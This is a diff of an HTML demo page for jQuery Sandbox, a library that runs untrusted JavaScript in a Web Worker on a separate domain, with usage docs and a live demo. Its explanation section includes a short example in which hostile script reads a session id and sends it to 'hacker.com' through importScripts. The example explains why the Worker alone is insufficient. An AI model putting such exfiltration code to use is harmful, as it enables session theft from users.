@@ -2,26 +2,155 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>jquery-sandbox</title>
+<title>jQuery Sandbox</title>
 <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.0.4/css/bootstrap.min.css" rel="stylesheet" type="text/css">
 <style type="text/css">
+body
+{
+    background: white url('http://twitter.github.com/bootstrap/assets/img/grid-18px-masked.png');
+}
 
+textarea
+{
+    -webkit-box-sizing: border-box; 
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    width: 100%;
+    min-height: 280px;
+    resize: vertical;
+}
+
+section
+{
+    margin-top: 50px;
+}
+
+.content
+{
+    margin-top: 60px;
+    margin-bottom: 120px;
+}
+
+ol li
+{
+    margin-bottom: 25px;
+}
+
+label
+{
+    font-weight: bold;
+}
 </style>
 <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.0.4/css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css">
 </head>
 <body>
-<div class="container">
-<form>
-    <fieldset class="control-group">
-        <label class="control-label" for="sandbox">Untrusted Javascript code</label>
-        <div class="controls">
-            <textarea id="sandbox"></textarea>
-        </div>
-    </fieldset>
-    <div class="form-actions">
-        <button type="submit" class="btn btn-primary">Run in sandbox</button>
-    </div>
+<div class="content container">
+<article>
+<header>
+<h1>jQuery Sandbox</h1>
+<p class="lead">Execute untrusted headless Javascript code in a sandbox.</p>
+</header>
+
+<section>
+<h2>How does it work?</h2>
+<hr/>
+<div class="row">
+<div class="span6">
+Quite simple, actually.
+<br/><br/>
+<ol>
+<li>
+<strong>jQuery Sandbox runs untrusted javascript in a HTML5 Worker which does not have access to the DOM.</strong>
+This mechanism ensures that the script cannot manipulate elements in your DOM, read your cookie or annoy your visitors with popups.
+However, it alone is not enough. For example:<br/><br/>
+<pre><code>var xhr = new XMLHttpRequest();
+xhr.open('GET', '/session_id', false);
+xhr.send();
+var session_id = xhr.responseText;
+
+importScripts('http://hacker.com/track.js?session_id=' + session_id);</code></pre>
+</li>
+<li>
+<strong>The Worker is also hosted on a seperate domain (anything other than your own domain) such that protection from browser's cross origin resource sharing (CORS) policy kicks in, further restricting malicious code.</strong>
+This will ensure that the script cannot read your local storage, use XMLHttpRequest to steal cookie and other data from pages on your site. (It can steal anything from our host domain, which does not have anything valuable.)
+</li>
+</ol>
+</div>
+<div class="span6">
+<h3>Installation</h3>
+<p>You will need the latest jQuery. </p>
+<p><pre><code>&lt;script type="text/javascript" src="//d3ltuim8m8ytq2.cloudfront.net/jquery-sandbox/0.0.1/jquery.sandbox.js"&gt;&lt;/script&gt;</code></pre></p>
+<br/><br/>
+<h3>Usage</h3>
+<p>The script does nothing until you call it via <code>$.sandbox(options)</code>.</p>
+<p><code>options</code> is a dictionary with the following keys:
+<ul>
+<li><strong>scripts</strong> - Array of script URLs to be executed. You can execute scripts stored in a string directly by supplying: <code>['data:application/javascript,' + encodeURIComponent(script)]</code></li>
+<li><strong>url</strong> (optional) - Path to the sandbox iframe. Default to <code>//d3ltuim8m8ytq2.cloudfront.net/jquery-sandbox/0.0.1/sandbox.html</code></li>
+<li><strong>timeout</strong> (optional) - Number of seconds before killing the script. Default to <code>0</code> which means no timeout</li>
+<li><strong>callback</strong> (optional) - Function to be called when the script does <code>postMessage()</code> or throws exception. Should be defined as <code>function(data, error) { ... }</code></li>
+</ul>
+</p>
+<p><code>var sandbox = $.sandbox(options);</code> also returns a sandbox object. You may call <code>sandbox.terminate();</code> to kill the running script</p>
+
+</div>
+</div>
+</section>
+
+<section>
+<h2>Demo</h2><hr/>
+<div class="row">
+<div class="span6">
+<p>This demo has a timeout setting of 5000, which means your script will be terminated after 5 seconds.</p>
+<br/><br/>
+<form class="form">
+<fieldset class="control-group">
+<label class="control-label" for="sandbox">Untrusted Javascript code</label>
+<div class="controls">
+<textarea id="sandbox">
+setInterval(function() {
+    postMessage("I run once a while.");
+}, 1000);
+
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'worker.js', false);
+xhr.send();
+postMessage("XHR got some data back: " + xhr.responseText.length);
+</textarea>
+</div>
+</fieldset>
+<div class="form-actions">
+<button type="submit" class="btn btn-primary">Run in sandbox</button>
+</div>
 </form>
+</div>
+<div class="span6">
+<h3>Output</h3>
+<br/>
+<div id="output">
+<div class="alert alert-success">Press "Run in sandbox" to execute your script.</div>
+</div>
+</div>
+</div>
+</section>
+
+<section>
+<h2>Limitations</h2>
+<hr/>
+<div class="row">
+<div class="span6">
+<p>Since jQuery Sandbox depends on HTML5 Worker, it will not work with IE[6-9]. However, it has been tested on the following browsers:
+<ul>
+    <li>IE 10.0</li>
+    <li>Latest Chrome</li>
+    <li>Latest Firefox</li>
+</ul>
+</p>
+</div>
+<div class="span6">
+</div>
+</section>
+
 </div>
 
 <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script>
@@ -29,19 +158,56 @@
 <script type="text/javascript" src="//d3ltuim8m8ytq2.cloudfront.net/jquery-sandbox/0.0.1/jquery.sandbox.js"></script>
 <script type="text/javascript">
 $(function() {
+    var output = $('#output');
+    var sandbox = null;
     $('form').submit(function (e) {
         e.preventDefault();
+
         var script = $('textarea#sandbox').val();
-        var sandbox = $.sandbox({
-            timeout: 1000,
+
+        output.html('');
+
+        if (sandbox) {
+            sandbox.terminate();
+            sandbox = null;
+        }
+        
+        sandbox = $.sandbox({
+            timeout: 5000,
             scripts: ['data:application/javascript,' + encodeURIComponent(script)],
             callback: function (data, error) {
-                console.log(error || data);
+                if (data) {
+                    if (typeof(data) !== 'string') {
+                        data = JSON.stringify(data);
+                    }
+                    $('<div />').addClass('alert alert-info').html(data).appendTo(output);
+                    return;
+                }
+ 
+                if (error === 'timeout') {
+                    $('<div />').addClass('alert alert-error').html('Script terminated due to time limit.').appendTo(output);
+                    this.terminate();
+                    sandbox = null;
+                    return;
+                }
+
+                $('<div />').addClass('alert alert-error').html('Terminating script due to unknown error: ' + error).appendTo(output);
                 this.terminate();
+                sandbox = null;
             }
         });
     });
 });
+</script>
+<script type="text/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-34085887-1']);
+_gaq.push(['_trackPageview']);
+(function() {
+var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
 </script>
 </body>
 </html>
